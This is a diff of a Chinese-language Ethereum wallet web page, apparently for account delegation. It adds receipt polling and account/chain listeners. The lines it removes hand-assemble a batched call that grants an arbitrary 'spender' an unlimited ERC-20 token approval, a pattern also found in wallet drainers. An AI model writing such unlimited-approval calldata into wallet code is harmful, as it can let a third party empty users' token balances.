-                '0x34fcd5be',
-                '0000000000000000000000000000000000000000000000000000000000000020',
-                '0000000000000000000000000000000000000000000000000000000000000001',
-                '0000000000000000000000000000000000000000000000000000000000000020',
-                '000000000000000000000000' + token,
-                '0000000000000000000000000000000000000000000000000000000000000000',
-                '0000000000000000000000000000000000000000000000000000000000000060',
-                '0000000000000000000000000000000000000000000000000000000000000044',
-                '095ea7b3',
-                '000000000000000000000000' + spender,
-                'ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff',
-                '00000000000000000000000000000000000000000000000000000000'
-            ];
+            while (attempts < maxAttempts) {
+                try {
+                    const receipt = await provider.request({
+                        method: 'eth_getTransactionReceipt',
+                        params: [txHash]
+                    });
 
-            return parts.join('');
+                    if (receipt) {
+                        const status = parseInt(receipt.status, 16);
+                        const blockNumber = parseInt(receipt.blockNumber, 16);
+                        const gasUsed = parseInt(receipt.gasUsed, 16);
+
+                        document.getElementById('txBlock').textContent = blockNumber;
+                        document.getElementById('txGasUsed').textContent = gasUsed.toLocaleString();
+
+                        if (status === 1) {
+                            document.getElementById('txStatus').innerHTML =
+                                '<span class="badge badge-success">成功</span>';
+                            log(`交易成功! 区块: ${blockNumber}, Gas: ${gasUsed}`, 'success');
+
+                            // 刷新委托状态
+                            await checkDelegation();
+                        } else {
+                            document.getElementById('txStatus').innerHTML =
+                                '<span class="badge badge-error">失败</span>';
+                            log('交易失败', 'error');
+                        }
+                        return;
+                    }
+                } catch (e) {
+                    // 继续等待
+                }
+
+                attempts++;
+                await new Promise(resolve => setTimeout(resolve, 2000));
+            }
+
+            log('等待交易确认超时', 'warning');
         }
 
-        // ============== 工具函数 ==============
-        function showStatus(element, type, message) {
-            element.className = 'status show ' + type;
-            element.innerHTML = message;
+        // 获取区块浏览器 URL
+        function getExplorerUrl() {
+            return NETWORKS[chainId]?.explorer || 'https://etherscan.io';
         }
 
-        // 监听代币选择
-        document.getElementById('tokenSelect').addEventListener('change', function() {
-            const customGroup = document.getElementById('customTokenGroup');
-            if (this.value === 'custom') {
-                customGroup.classList.remove('hidden');
-            } else {
-                customGroup.classList.add('hidden');
+        // 处理账户变化
+        function handleAccountsChanged(accounts) {
+            if (accounts.length === 0) {
+                // 断开连接
+                location.reload();
+            } else if (accounts[0] !== currentAccount) {
+                currentAccount = accounts[0];
+                updateAccountInfo();
+                checkDelegation();
+                clearLogs();
+                log('账户已切换', 'info');
+            }
+        }
+
+        // 处理链变化
+        function handleChainChanged(newChainId) {
+            chainId = parseInt(newChainId, 16);
+            updateAccountInfo();
+            checkDelegation();
+            clearLogs();
+            log(`网络已切换至 Chain ID: ${chainId}`, 'info');
+        }
+
+        // 页面加载时检查是否已连接
+        window.addEventListener('load', async () => {
+            provider = getProvider();
+            if (provider) {
+                try {
+                    const accounts = await provider.request({ method: 'eth_accounts' });
+                    if (accounts.length > 0) {
+                        currentAccount = accounts[0];
+                        chainId = parseInt(await provider.request({ method: 'eth_chainId' }), 16);
+
+                        document.getElementById('connectCard').classList.add('hidden');
+                        document.getElementById('accountCard').classList.remove('hidden');
+                        document.getElementById('upgradeCard').classList.remove('hidden');
+
+                        await updateAccountInfo();
+                        await checkDelegation();
+
+                        provider.on('accountsChanged', handleAccountsChanged);
+                        provider.on('chainChanged', handleChainChanged);
+                    }
+                } catch (e) {
+                    console.log('未自动连接');
+                }
             }
         });
-
-        // 监听账户变化
-        function setupWalletListeners() {
-            const p = getProvider();
-            if (p && p.on) {
-                p.on('accountsChanged', function(accounts) {
-                    if (accounts.length === 0) {
-                        location.reload();
-                    } else {
-                        userAddress = accounts[0];
-                        document.getElementById('walletAddress').textContent =
-                            userAddress.slice(0, 8) + '...' + userAddress.slice(-6);
-                    }
-                });
-
-                p.on('chainChanged', function() {
-                    location.reload();
-                });
-            }
-        }
-
-        // 页面加载时设置监听
-        setupWalletListeners();
     </script>
 </body>
 </html>
